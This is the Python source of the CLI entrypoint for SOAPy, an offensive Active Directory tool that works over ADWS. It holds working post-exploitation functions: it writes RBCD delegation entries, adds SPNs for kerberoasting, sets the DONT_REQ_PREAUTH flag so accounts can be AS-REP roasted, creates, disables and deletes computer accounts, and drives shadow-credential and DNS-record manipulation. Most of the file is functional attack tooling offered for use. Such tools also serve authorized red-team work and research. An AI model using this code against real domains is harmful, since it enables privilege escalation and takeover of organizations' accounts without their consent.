#!/usr/bin/env python3
"""
soa.py

Main CLI entrypoint for SOAPy ADWS operations, extended to support:
  - AD-integrated DNS management (add/modify/remove/tombstone/resurrect)
  - Computer management (create/delete/disable)
  - Shadow Credentials (msDS-KeyCredentialLink) management
  - RBCD, SPN, ASREP attacks

Shadow Credentials options:
  --shadow-creds ACTION   Shadow Credentials action (list/add/remove/clear/info)
  --shadow-target TARGET  Target account for Shadow Credentials
  --device-id ID          Device ID for remove/info actions
  --cert-filename NAME    Filename for certificate export
  --cert-export TYPE      Export type: PEM or PFX (default: PFX)
  --cert-password PASS    Password for PFX file
  --shadow-creds-help     Display detailed Shadow Credentials help
"""

import argparse
import logging
import sys
from base64 import b64decode, b64encode
import base64
import string
import random
from uuid import uuid4
from typing import Optional

from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket.ldap.ldaptypes import (
    ACCESS_ALLOWED_ACE,
    ACCESS_MASK,
    ACE,
    ACL,
    LDAP_SID,
    SR_SECURITY_DESCRIPTOR,
)

from .adws import ADWSAuthType, ADWSConnect, KerberosAuth, NTLMAuth
from .soap_templates import NAMESPACES, LDAP_CREATE_FOR_RESOURCEFACTORY, LDAP_DELETE_FOR_RESOURCE, LDAP_PUT_FSTRING

# DNS ADWS helpers
from .ad_dns_manager_adws import (
    add_dns_record_adws,
    modify_dns_record_adws,
    remove_dns_record_adws,
    tombstone_dns_record_adws,
    resurrect_dns_record_adws,
)

# Shadow Credentials helpers
try:
    from src.shadow_credentials import (
        ShadowCredentialsADWS,
        shadow_credentials_list,
        shadow_credentials_add,
        shadow_credentials_remove,
        shadow_credentials_clear,
        shadow_credentials_info,
        print_shadow_creds_help,
        DSINTERNALS_AVAILABLE,
    )
    SHADOW_CREDS_AVAILABLE = DSINTERNALS_AVAILABLE
except ImportError:
    SHADOW_CREDS_AVAILABLE = False
    def print_shadow_creds_help():
        print("Shadow Credentials module not available. Install dsinternals: pip install dsinternals")

# ---------------------------------------------------------------------------
# Utility helpers
# ---------------------------------------------------------------------------

def _emit(emit, level, message):
    """Route a message to a callback, or fall back to ``print()``.

    ``emit`` est soit ``None`` (compat ascendante : on fait ``print()``)
    soit un callable ``(level, message)`` que l'appelant fournit pour
    intercept output. The supported levels are:
      - ``"info"``   : step messages (formerly ``[*]``)
      - ``"ok"``     : successes (formerly ``[+]``)
      - ``"fail"``   : failures (formerly ``[-]``)

    On the NetExec side, ``emit=lambda lvl, msg: logger.<lvl>(msg)`` is
    passed to reroute through the standard NXC log chain.
    """
    if emit is not None:
        emit(level, message)
        return
    # Legacy behavior (SOAPy standalone): prefix + stdout
    prefix = {"info": "[*]", "ok": "[+]", "fail": "[-]"}.get(level, "[*]")
    print(f"{prefix} {message}")


def _create_empty_sd():
    sd = SR_SECURITY_DESCRIPTOR()
    sd["Revision"] = b"\x01"
    sd["Sbz1"] = b"\x00"
    sd["Control"] = 32772
    sd["OwnerSid"] = LDAP_SID()
    sd["OwnerSid"].fromCanonical("S-1-5-32-544")
    sd["GroupSid"] = b""
    sd["Sacl"] = b""
    acl = ACL()
    acl["AclRevision"] = 4
    acl["Sbz1"] = 0
    acl["Sbz2"] = 0
    acl.aces = []
    sd["Dacl"] = acl
    return sd


def _create_allow_ace(sid: LDAP_SID):
    nace = ACE()
    nace["AceType"] = ACCESS_ALLOWED_ACE.ACE_TYPE
    nace["AceFlags"] = 0x00
    acedata = ACCESS_ALLOWED_ACE()
    acedata["Mask"] = ACCESS_MASK()
    acedata["Mask"]["Mask"] = 983551
    acedata["Sid"] = sid.getData()
    nace["Ace"] = acedata
    return nace


def getAccountDN(target: str, username: str, ip: str, domain: str, auth: ADWSAuthType):
    """Get the distinguishedName of a user or computer in AD using ADWS Pull"""
    get_account_query = f"(samAccountName={target})"
    pull_client = ADWSConnect.pull_client(ip, domain, username, auth)

    attributes: list = ["distinguishedname"]

    pull_et = pull_client.pull(query=get_account_query, basedn=None, attributes=attributes)

    distinguishedName_elem = None

    for tag in [".//addata:user", ".//addata:computer"]:
        for item in pull_et.findall(tag, namespaces=NAMESPACES):
            distinguishedName_elem = item.find(
                ".//addata:distinguishedName/ad:value", namespaces=NAMESPACES
            )
            if distinguishedName_elem is not None:
                break
        if distinguishedName_elem is not None:
            break

    if distinguishedName_elem is None or distinguishedName_elem.text is None:
        raise RuntimeError(f"Unable to locate DN for target '{target}'")

    return distinguishedName_elem.text


from xml.etree import ElementTree as ET
from .adws import ADWSConnect, ADWSError

def delete_computer(
    machine_name: str,
    username: str,
    ip: str,
    domain: str,
    auth: ADWSAuthType,
    *,
    emit=None,
) -> bool:
    """Delete an AD computer object using ADWS WS-Transfer Delete.

    ``emit`` (optional): callable ``(level, message)`` for routing output.
    When ``None`` (default), output goes to ``print()`` (legacy SOAPy
    behavior).
    """
    _emit(emit, "info", f"Attempting to delete computer: {machine_name}")

    sam = machine_name if machine_name.endswith("$") else machine_name + "$"

    _emit(emit, "info", "Locating computer in AD...")
    try:
        dn = getAccountDN(target=sam, username=username, ip=ip, domain=domain, auth=auth)
    except Exception as e:
        _emit(emit, "fail", f"Failed to locate machine {sam}: {e}")
        return False

    if not dn:
        _emit(emit, "fail", f"Could not find DN for computer {sam}")
        return False

    _emit(emit, "ok", f"Found DN: {dn}")

    msg_id = f"urn:uuid:{uuid4()}"
    delete_payload = LDAP_DELETE_FOR_RESOURCE.format(object_dn=dn, fqdn=ip, uuid=msg_id)

    _emit(emit, "info", "Connecting to ADWS Resource endpoint to delete object...")

    client = ADWSConnect(ip, domain, username, auth, "Resource")
    try:
        client._nmf.send(delete_payload)
        response = client._nmf.recv()
    except Exception as e:
        _emit(emit, "fail", f"Transport error when sending Delete request: {e}")
        return False

    try:
        et = client._handle_str_to_xml(response)
    except ADWSError:
        s = response if isinstance(response, str) else response.decode(errors="ignore")
        start = s.find('<')
        if start != -1:
            s = s[start:]
        try:
            root = ET.fromstring(s)
            ns = {'ad': 'http://schemas.microsoft.com/2008/1/ActiveDirectory'}
            msg_elem = root.find('.//ad:Message', namespaces=ns)
            msg = msg_elem.text.strip() if msg_elem is not None and msg_elem.text else None
            if msg:
                _emit(emit, "fail", f"AD error: {msg.splitlines()[0]}")
            else:
                _emit(emit, "fail", "ADWS operation failed.")
        except Exception:
            _emit(emit, "fail", "ADWS operation failed.")
        return False

    if et is None:
        _emit(emit, "fail", "Empty or malformed DeleteResponse.")
        return False

    fault = et.find(".//{http://www.w3.org/2003/05/soap-envelope}Fault")
    if fault is not None:
        _emit(emit, "fail", "ADWS operation failed (SOAP Fault present).")
        return False

    _emit(emit, "ok", f"Computer {sam} successfully deleted.")
    return True


def encode_unicode_pwd(password: str) -> str:
    quoted = f'"{password}"'
    pwd_utf16 = quoted.encode('utf-16-le')
    return base64.b64encode(pwd_utf16).decode()


def add_computer(
    target: str,
    machine_name: str,
    ou_dn: str,
    username: str,
    ip: str,
    domain: str,
    auth: ADWSAuthType,
    remove: bool = False,
    computer_pass: str = None,
    spn_list: list = None,
    *,
    emit=None,
) -> tuple:
    """Create a computer object in AD via ADWS ResourceFactory.

    Returns ``(success: bool, info: dict)`` where ``info`` contains
    ``machine_name`` and ``computer_pass`` even on failure (useful for the
    caller to know what was generated).

    ``emit`` (optional): callable ``(level, message)`` for output routing.
    """
    if remove:
        raise NotImplementedError("Removal logic is not implemented.")

    import secrets

    if machine_name is None:
        machine_name = 'DESKTOP-' + (''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(8)))

    _emit(emit, "ok", f"Using machine name: {machine_name}")

    sam = machine_name if machine_name.endswith("$") else machine_name + "$"
    cn = machine_name
    host = cn.rstrip("$")

    if ou_dn:
        container_dn = ou_dn
    else:
        domain_parts = [f"DC={p}" for p in domain.split(".") if p]
        domain_dn = ",".join(domain_parts)
        container_dn = f"CN=Computers,{domain_dn}"

    logging.info(f"Creating computer account {sam} in {container_dn} via ADWS ResourceFactory")

    if computer_pass is None:
        alphabet = string.ascii_letters + string.digits + "!@#$%^&*?"
        computer_pass = ''.join(secrets.choice(alphabet) for _ in range(16))

    _emit(emit, "ok", f"Using computer password: {computer_pass}")

    info = {"machine_name": machine_name, "sam": sam, "computer_pass": computer_pass}

    encoded_pass = encode_unicode_pwd(computer_pass)

    default_spns = [
        f"HOST/{host}",
        f"HOST/{host}.{domain}",
        f"RestrictedKrbHost/{host}",
        f"RestrictedKrbHost/{host}.{domain}",
    ]

    spns = spn_list if spn_list else default_spns

    attrs = {
        "addata:objectClass": ["computer"],
        "ad:container-hierarchy-parent": [container_dn],
        "ad:relativeDistinguishedName": [f"CN={cn}"],
        "addata:sAMAccountName": [sam],
        "addata:userAccountControl": ["4096"],
        "addata:dnsHostName": [f"{host}.{domain}"],
        "addata:servicePrincipalName": spns,
        "addata:unicodePwd": [encoded_pass],
    }

    atav_xml = ""
    for attr_type, values in attrs.items():
        values_xml = ""
        for v in values:
            if attr_type == "addata:unicodePwd":
                values_xml += f'<ad:value xsi:type="xsd:base64Binary">{v}</ad:value>'
            else:
                values_xml += f'<ad:value xsi:type="xsd:string">{v}</ad:value>'

        atav_xml += (
            "      <AttributeTypeAndValue>\n"
            f"        <AttributeType>{attr_type}</AttributeType>\n"
            f"        <AttributeValue>\n          {values_xml}\n        </AttributeValue>\n"
            "      </AttributeTypeAndValue>\n"
        )

    msg_id = f"urn:uuid:{uuid4()}"

    addrequest_payload = LDAP_CREATE_FOR_RESOURCEFACTORY.format(
        uuid=msg_id,
        fqdn=ip,
        atav_xml=atav_xml
    )

    client = ADWSConnect(ip, domain, username, auth, "ResourceFactory")
    client._nmf.send(addrequest_payload)
    response = client._nmf.recv()

    et = client._handle_str_to_xml(response)
    if et is None:
        _emit(emit, "fail", "AddRequest response empty or malformed.")
        return False, info

    logging.info("AddRequest successful. Locating newly created object...")

    dn = getAccountDN(target=sam, username=username, ip=ip, domain=domain, auth=auth)
    if not dn:
        _emit(emit, "fail", "Failed to locate DN of the newly created computer.")
        return False, info

    info["dn"] = dn
    logging.info(f"Created object DN: {dn}")

    _emit(emit, "ok", f"Computer {sam} successfully created in {dn}")
    return True, info


def set_spn(
    target: str,
    value: str,
    username: str,
    ip: str,
    domain: str,
    auth: ADWSAuthType,
    remove: bool = False,
    *,
    emit=None,
):
    """Set a value in servicePrincipalName.

    ``emit`` (optional): callable ``(level, message)`` for output routing.
    """
    dn = getAccountDN(target=target, username=username, ip=ip, domain=domain, auth=auth)

    put_client = ADWSConnect.put_client(ip, domain, username, auth)

    put_client.put(
        object_ref=dn,
        operation="add" if not remove else "delete",
        attribute="addata:servicePrincipalName",
        data_type="string",
        value=value,
    )

    _emit(
        emit, "ok",
        f"servicePrincipalName {value} {'removed' if remove else 'written'} successfully on {target}!",
    )


def set_asrep(
    target: str,
    username: str,
    ip: str,
    domain: str,
    auth: ADWSAuthType,
    remove: bool = False,
    *,
    emit=None,
):
    """Set or clear the DONT_REQ_PREAUTH flag on userAccountControl.

    ``emit`` (optional): callable ``(level, message)`` for output routing.
    """
    get_accounts_queries = f"(sAMAccountName={target})"
    pull_client = ADWSConnect.pull_client(ip, domain, username, auth)

    attributes: list = ["userAccountControl", "distinguishedName"]

    pull_et = pull_client.pull(query=get_accounts_queries, basedn=None, attributes=attributes)
    uac = None
    distinguishedName_elem = None

    for item in pull_et.findall(".//addata:user", namespaces=NAMESPACES):
        uac = item.find(".//addata:userAccountControl/ad:value", namespaces=NAMESPACES)
        distinguishedName_elem = item.find(".//addata:distinguishedName/ad:value", namespaces=NAMESPACES)

    if distinguishedName_elem is None or distinguishedName_elem.text is None:
        raise RuntimeError("Unable to locate target DN for asrep operation")
    dn = distinguishedName_elem.text

    put_client = ADWSConnect.put_client(ip, domain, username, auth)
    if not remove:
        newUac = int(uac.text) | 0x400000
    else:
        newUac = int(uac.text) & ~0x400000

    put_client.put(
        object_ref=dn,
        operation="replace",
        attribute="addata:userAccountControl",
        data_type="string",
        value=newUac,
    )

    _emit(
        emit, "ok",
        f"DONT_REQ_PREAUTH {'removed' if remove else 'written'} successfully!",
    )


def set_rbcd(
    target: str,
    account: str,
    username: str,
    ip: str,
    domain: str,
    auth: ADWSAuthType,
    remove: bool = False,
    *,
    emit=None,
):
    """Write or remove RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity).

    ``emit`` (optional): callable ``(level, message)`` for output routing.
    """
    get_accounts_queries = f"(|(sAMAccountName={target})(sAMAccountName={account}))"
    pull_client = ADWSConnect.pull_client(ip, domain, username, auth)

    attributes: list = [
        "samaccountname",
        "objectsid",
        "distinguishedname",
        "msds-allowedtoactonbehalfofotheridentity",
    ]

    pull_et = pull_client.pull(query=get_accounts_queries, basedn=None, attributes=attributes)

    target_sd: SR_SECURITY_DESCRIPTOR = _create_empty_sd()
    target_dn: str = ""
    account_sid: LDAP_SID | None = None

    for item in pull_et.findall(".//addata:computer", namespaces=NAMESPACES):
        sam_name_elem = item.find(".//addata:sAMAccountName/ad:value", namespaces=NAMESPACES)
        sd_elem = item.find(".//addata:msDS-AllowedToActOnBehalfOfOtherIdentity/ad:value", namespaces=NAMESPACES)
        sid_elem = item.find(".//addata:objectSid/ad:value", namespaces=NAMESPACES)
        distinguishedName_elem = item.find(".//addata:distinguishedName/ad:value", namespaces=NAMESPACES)

        sam_name = sam_name_elem.text if sam_name_elem != None else ""
        sid = sid_elem.text if sid_elem != None else ""
        sd = sd_elem.text if sd_elem != None else ""
        dn = distinguishedName_elem.text if distinguishedName_elem != None else ""

        if sam_name and sid and sam_name.casefold() == account.casefold():
            account_sid = LDAP_SID(data=b64decode(sid))
        if dn and sam_name and sam_name.casefold() == target.casefold():
            target_dn = dn
            if sd:
                target_sd = SR_SECURITY_DESCRIPTOR(data=b64decode(sd))

    if not account_sid:
        logging.critical(f"Unable to find {target} or {account}.")
        raise SystemExit()

    target_sd["Dacl"].aces = [
        ace
        for ace in target_sd["Dacl"].aces
        if ace["Ace"]["Sid"].formatCanonical() != account_sid.formatCanonical()
    ]
    if not remove:
        target_sd["Dacl"].aces.append(_create_allow_ace(account_sid))

    put_client = ADWSConnect.put_client(ip, domain, username, auth)
    put_client.put(
        object_ref=target_dn,
        operation="replace",
        attribute="addata:msDS-AllowedToActOnBehalfOfOtherIdentity",
        data_type="base64Binary",
        value=b64encode(target_sd.getData()).decode("utf-8"),
    )

    if remove and len(target_sd["Dacl"].aces) == 0:
        put_client.put(
            object_ref=target_dn,
            operation="delete",
            attribute="addata:msDS-AllowedToActOnBehalfOfOtherIdentity",
            data_type="base64Binary",
            value=b64encode(target_sd.getData()).decode("utf-8"),
        )

    _emit(
        emit, "ok",
        f"msDS-AllowedToActOnBehalfOfIdentity {'removed' if remove else 'written'} successfully!",
    )
    _emit(
        emit, "ok",
        f"{account} {'can not' if remove else 'can'} delegate to {target}",
    )


def disable_machine_account(
    machine_name: str,
    username: str,
    ip: str,
    domain: str,
    auth: ADWSAuthType,
    *,
    emit=None,
) -> bool:
    """Disable a computer account.

    ``emit`` (optional): callable ``(level, message)`` for output routing.
    """
    _emit(emit, "info", f"Attempting to disable computer: {machine_name}")

    sam = machine_name if machine_name.endswith("$") else machine_name + "$"

    get_accounts_queries = f"(sAMAccountName={sam})"
    pull_client = ADWSConnect.pull_client(ip, domain, username, auth)

    attributes: list = ["userAccountControl", "distinguishedName"]

    try:
        pull_et = pull_client.pull(query=get_accounts_queries, basedn=None, attributes=attributes)
    except Exception as e:
        _emit(emit, "fail", f"Failed LDAP pull for {sam}: {e}")
        return False

    uac_elem = None
    distinguishedName_elem = None

    for tag in [".//addata:computer", ".//addata:user"]:
        for item in pull_et.findall(tag, namespaces=NAMESPACES):
            if uac_elem is None:
                uac_elem = item.find(".//addata:userAccountControl/ad:value", namespaces=NAMESPACES)
            if distinguishedName_elem is None:
                distinguishedName_elem = item.find(".//addata:distinguishedName/ad:value", namespaces=NAMESPACES)
            if uac_elem is not None and distinguishedName_elem is not None:
                break
        if uac_elem is not None and distinguishedName_elem is not None:
            break

    if distinguishedName_elem is None or distinguishedName_elem.text is None:
        _emit(emit, "fail", f"Unable to locate DN for {sam}")
        return False

    dn = distinguishedName_elem.text

    if uac_elem is None or uac_elem.text is None:
        _emit(emit, "fail", f"Unable to locate userAccountControl for {sam}")
        return False

    try:
        current_uac = int(uac_elem.text)
    except Exception as e:
        _emit(emit, "fail", f"Failed to parse userAccountControl value: {e}")
        return False

    ACCOUNTDISABLE_FLAG = 0x2

    if (current_uac & ACCOUNTDISABLE_FLAG) != 0:
        _emit(emit, "info", f"Computer {sam} is already disabled.")
        return True

    new_uac = current_uac | ACCOUNTDISABLE_FLAG

    try:
        put_client = ADWSConnect.put_client(ip, domain, username, auth)
        put_client.put(
            object_ref=dn,
            operation="replace",
            attribute="addata:userAccountControl",
            data_type="string",
            value=new_uac,
        )
    except Exception as e:
        _emit(emit, "fail", f"Failed to write new userAccountControl for {sam}: {e}")
        return False

    _emit(emit, "ok", f"Computer {sam} successfully disabled.")
    return True


# ---------------------------------------------------------------------------
# CLI entrypoint: run_cli()
# ---------------------------------------------------------------------------

def run_cli():
    print("""
███████╗ ██████╗  █████╗ ██████╗ ██╗   ██╗
██╔════╝██╔═══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝
███████╗██║   ██║███████║██████╔╝ ╚████╔╝ 
╚════██║██║   ██║██╔══██║██╔═══╝   ╚██╔╝  
███████║╚██████╔╝██║  ██║██║        ██║   
╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝        ╚═╝  

v1.0.0
@_logangoins
github.com/logangoins/SOAPy
""")

    parser = argparse.ArgumentParser(
        add_help=True,
        description="Perform AD reconnaissance and post-exploitation through ADWS over SOCKS5",
    )
    parser.add_argument(
        "connection",
        action="store",
        nargs="?",
        default=None,
        help="domain/username[:password]@<targetName or address>",
    )
    parser.add_argument(
        "--debug",
        action="store_true",
        help="Turn DEBUG output ON"
    )
    parser.add_argument(
        "-ts",
        action="store_true",
        help="Adds timestamp to every logging output."
    )
    parser.add_argument(
        "-nt", "--nthash",
        action="store",
        metavar="nthash",
        help="Use an NT hash for authentication",
    )
    parser.add_argument(
        "-k",
        "--kerberos",
        action="store_true",
        help="Use Kerberos authentication from the KRB5CCNAME ccache",
    )

    # Enumeration options
    enum = parser.add_argument_group('Enumeration')
    enum.add_argument("--users", action="store_true", help="Enumerate user objects")
    enum.add_argument("--computers", action="store_true", help="Enumerate computer objects")
    enum.add_argument("--groups", action="store_true", help="Enumerate group objects")
    enum.add_argument("--constrained", action="store_true", help="Enumerate objects with msds-allowedtodelegateto")
    enum.add_argument("--unconstrained", action="store_true", help="Enumerate objects with TRUSTED_FOR_DELEGATION")
    enum.add_argument("--spns", action="store_true", help="Enumerate accounts with servicePrincipalName set")
    enum.add_argument("--asreproastable", action="store_true", help="Enumerate accounts with DONT_REQ_PREAUTH set")
    enum.add_argument("--admins", action="store_true", help="Enumerate high privilege accounts")
    enum.add_argument("--rbcds", action="store_true", help="Enumerate accounts with msDs-AllowedToActOnBehalfOfOtherIdentity set")
    enum.add_argument("-q", "--query", action="store", metavar="query", help="Raw query to execute on the target")
    enum.add_argument("-f", "--filter", action="store", metavar="attr,attr,...", help="Attributes to select, comma separated")
    enum.add_argument("-dn", "--distinguishedname", action="store", metavar="distinguishedname", help="The root object's distinguishedName for the query")
    enum.add_argument("-p", "--parse", action="store_true", help="Parse attributes to human readable format")

    # Writing options
    writing = parser.add_argument_group('Writing')
    writing.add_argument("--rbcd", action="store", metavar="source", help="Write/remove RBCD (source computer)")
    writing.add_argument("--spn", action="store", metavar="value", help='Write servicePrincipalName value (use --remove to delete)')
    writing.add_argument("--asrep", action="store_true", help="Write DONT_REQ_PREAUTH flag (asrep roastable)")
    writing.add_argument("--account", action="store", metavar="account", help="Account to perform operations on")
    writing.add_argument("--remove", action="store_true", help="Remove attribute value based on operation")

    # Computer management
    writing.add_argument("--addcomputer", nargs='?', const='', action="store", metavar="MACHINE", help="Create a computer account in AD")
    writing.add_argument("--computer-pass", action="store", metavar="pass", help="Password for the new computer account")
    writing.add_argument("--ou", action="store", metavar="ou", help="DN of the OU where to create the computer")
    writing.add_argument("--delete-computer", action="store", metavar="MACHINE", help="Delete an existing computer account")
    writing.add_argument("--disable-account", action="store", metavar="MACHINE", help="Disable a computer account")

    # Shadow Credentials options
    writing.add_argument("--shadow-creds", action="store", metavar="ACTION",
                       choices=['list', 'add', 'remove', 'clear', 'info'],
                       help="Shadow Credentials action: list, add, remove, clear, info")
    writing.add_argument("--shadow-target", action="store", metavar="TARGET",
                       help="Target account for Shadow Credentials operation")
    writing.add_argument("--device-id", action="store", metavar="ID",
                       help="Device ID for remove/info actions")
    writing.add_argument("--cert-filename", action="store", metavar="NAME",
                       help="Filename for certificate export (add action)")
    writing.add_argument("--cert-export", action="store", metavar="TYPE",
                       choices=['PEM', 'PFX'], default='PFX',
                       help="Export type: PEM or PFX (default: PFX)")
    writing.add_argument("--cert-password", action="store", metavar="PASS",
                       help="Password for PFX file (random if not set)")

    # DNS management options
    writing.add_argument("--dns-add", action="store", metavar="FQDN", help="Add A record (FQDN). Requires --dns-ip")
    writing.add_argument("--dns-modify", action="store", metavar="FQDN", help="Modify/replace A record (FQDN). Requires --dns-ip")
    writing.add_argument("--dns-remove", action="store", metavar="FQDN", help="Remove A record (FQDN). Requires --dns-ip unless --ldapdelete")
    writing.add_argument("--dns-tombstone", action="store", metavar="FQDN", help="Tombstone a dnsNode")
    writing.add_argument("--dns-resurrect", action="store", metavar="FQDN", help="Resurrect a tombstoned dnsNode")
    writing.add_argument("--dns-ip", action="store", metavar="IP", help="IP used with dns add/modify/remove")
    writing.add_argument("--ldapdelete", action="store_true", help="Use delete on dnsNode object")
    writing.add_argument("--allow-multiple", action="store_true", help="Allow multiple A records when adding")
    writing.add_argument("--ttl", type=int, default=180, help="TTL for new A record (default 180)")
    writing.add_argument("--tcp", action="store_true", help="Use DNS over TCP when fetching SOA serial")

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if options.kerberos and options.nthash:
        parser.error("-k/--kerberos cannot be used with -nt/--nthash")

    # Check if connection is required
    if options.connection is None:
        parser.print_help()
        sys.exit(1)

    logger.init(options.ts)
    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password, remoteName = parse_target(options.connection)

    if domain is None:
        domain = ""

    if options.kerberos and (not domain or not username):
        from impacket.krb5.ccache import CCache

        domain, username, _, _ = CCache.parseFile(
            domain=domain,
            username=username,
            target=f"LDAP/{remoteName}",
        )

    # Ask for password if missing and username present
    if password == "" and username != "" and options.nthash is None and not options.kerberos:
        from getpass import getpass
        password = getpass("Password:")

    queries: dict[str, str] = {
        "users": "(&(objectClass=user)(objectCategory=person))",
        "computers": "(objectClass=computer)",
        "constrained": "(msds-allowedtodelegateto=*)",
        "unconstrained": "(userAccountControl:1.2.840.113556.1.4.803:=524288)",
        "spns": "(&(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512))(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))",
        "asreproastable":"(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))",
        "admins": "(&(objectClass=user)(adminCount=1))",
        "groups": "(objectCategory=group)",
        "rbcds": "(msds-allowedtoactonbehalfofotheridentity=*)",
    }

    ldap_query = []
    ldap_query.append(options.query)
    for flag, this_query in queries.items():
        if getattr(options, flag):
            ldap_query.append(this_query)

    if not domain:
        logging.critical('"domain" must be specified')
        raise SystemExit()

    if not username:
        logging.critical('"username" must be specified')
        raise SystemExit()

    auth = KerberosAuth() if options.kerberos else NTLMAuth(password=password, hashes=options.nthash)

    try:
        # -----------------------
        # Shadow Credentials operations
        # -----------------------
        if options.shadow_creds:
            if not SHADOW_CREDS_AVAILABLE:
                logging.critical("Shadow Credentials module not available. Install dsinternals: pip install dsinternals")
                logging.critical("Use --shadow-creds-help for more information")
                raise SystemExit(1)
            
            if not options.shadow_target:
                logging.critical("--shadow-target is required for Shadow Credentials operations")
                raise SystemExit(1)
            
            if options.shadow_creds == 'list':
                shadow_credentials_list(
                    target=options.shadow_target,
                    username=username,
                    ip=remoteName,
                    domain=domain,
                    auth=auth,
                )
            
            elif options.shadow_creds == 'add':
                shadow_credentials_add(
                    target=options.shadow_target,
                    username=username,
                    ip=remoteName,
                    domain=domain,
                    auth=auth,
                    filename=options.cert_filename,
                    export_type=options.cert_export,
                    pfx_password=options.cert_password,
                )
            
            elif options.shadow_creds == 'remove':
                if not options.device_id:
                    logging.critical("--device-id is required for remove action")
                    raise SystemExit(1)
                shadow_credentials_remove(
                    target=options.shadow_target,
                    device_id=options.device_id,
                    username=username,
                    ip=remoteName,
                    domain=domain,
                    auth=auth,
                )
            
            elif options.shadow_creds == 'clear':
                shadow_credentials_clear(
                    target=options.shadow_target,
                    username=username,
                    ip=remoteName,
                    domain=domain,
                    auth=auth,
                )
            
            elif options.shadow_creds == 'info':
                if not options.device_id:
                    logging.critical("--device-id is required for info action")
                    raise SystemExit(1)
                shadow_credentials_info(
                    target=options.shadow_target,
                    device_id=options.device_id,
                    username=username,
                    ip=remoteName,
                    domain=domain,
                    auth=auth,
                )

        # RBCD
        elif options.rbcd is not None:
            if not options.account:
                logging.critical('"--rbcd" must be used with "--account"')
                raise SystemExit()
            set_rbcd(
                ip=remoteName,
                domain=domain,
                target=options.account,
                account=options.rbcd,
                username=username,
                auth=auth,
                remove=options.remove,
            )

        # SPN write/remove
        elif options.spn is not None:
            if not options.account:
                logging.critical('Please specify an account with "--account"')
                raise SystemExit()
            set_spn(
                ip=remoteName,
                domain=domain,
                target=options.account,
                value=options.spn,
                username=username,
                auth=auth,
                remove=options.remove
            )

        # ASREP
        elif options.asrep:
            if not options.account:
                logging.critical('Please specify an account with "--account"')
                raise SystemExit()
            set_asrep(
                ip=remoteName,
                domain=domain,
                target=options.account,
                username=username,
                auth=auth,
                remove=options.remove
            )

        # Add computer
        elif getattr(options, "addcomputer", None) is not None:
            machine_name = None if options.addcomputer == "" else options.addcomputer
            add_computer(
                target=options.account if options.account else None,
                machine_name=machine_name,
                ou_dn=options.ou,
                username=username,
                ip=remoteName,
                domain=domain,
                auth=auth,
                remove=options.remove,
                computer_pass=options.computer_pass,
            )

        # Disable account
        elif options.disable_account:
            disable_machine_account(
                machine_name=options.disable_account,
                username=username,
                ip=remoteName,
                domain=domain,
                auth=auth,
            )

        # Delete computer
        elif options.delete_computer:
            delete_computer(
                machine_name=options.delete_computer,
                username=username,
                ip=remoteName,
                domain=domain,
                auth=auth,
            )

        # DNS operations
        elif options.dns_add:
            if not options.dns_ip:
                logging.critical("--dns-add requires --dns-ip")
                raise SystemExit(1)
            add_dns_record_adws(
                fqdn_record=options.dns_add,
                ip_addr=options.dns_ip,
                username=username,
                ip=remoteName,
                domain=domain,
                auth=auth,
                allow_multiple=options.allow_multiple,
                ttl=options.ttl,
                tcp=options.tcp,
            )

        elif options.dns_modify:
            if not options.dns_ip:
                logging.critical("--dns-modify requires --dns-ip")
                raise SystemExit(1)
            modify_dns_record_adws(
                fqdn_record=options.dns_modify,
                new_ip=options.dns_ip,
                username=username,
                ip=remoteName,
                domain=domain,
                auth=auth,
                ttl=options.ttl,
                tcp=options.tcp,
            )

        elif options.dns_remove:
            if not options.ldapdelete and not options.dns_ip:
                logging.critical("--dns-remove requires --dns-ip unless --ldapdelete is specified")
                raise SystemExit(1)
            remove_dns_record_adws(
                fqdn_record=options.dns_remove,
                ip_to_remove=options.dns_ip if options.dns_ip else "",
                username=username,
                ip=remoteName,
                domain=domain,
                auth=auth,
                tcp=options.tcp,
                ldapdelete=options.ldapdelete,
            )

        elif options.dns_tombstone:
            tombstone_dns_record_adws(
                fqdn_record=options.dns_tombstone,
                username=username,
                ip=remoteName,
                domain=domain,
                auth=auth,
                tcp=options.tcp,
            )

        elif options.dns_resurrect:
            resurrect_dns_record_adws(
                fqdn_record=options.dns_resurrect,
                username=username,
                ip=remoteName,
                domain=domain,
                auth=auth,
                tcp=options.tcp,
            )

        # Enumeration / Pull operations (default)
        else:
            if not ldap_query or all(q is None for q in ldap_query):
                logging.critical("No operation specified. Use --help for available options.")
                raise SystemExit()

            client = ADWSConnect.pull_client(
                ip=remoteName,
                domain=domain,
                username=username,
                auth=auth,
            )

            for current_query in ldap_query:
                if not current_query:
                    continue

                if options.filter is not None:
                    attributes: list = [x.strip() for x in options.filter.split(",")]
                else:
                    attributes = None
                
                client.pull(current_query, options.distinguishedname, attributes, print_incrementally=True, parse_values=options.parse)

    except Exception as e:
        logging.exception("Operation failed: %s", e)
        raise SystemExit(1)


if __name__ == "__main__":
    run_cli()
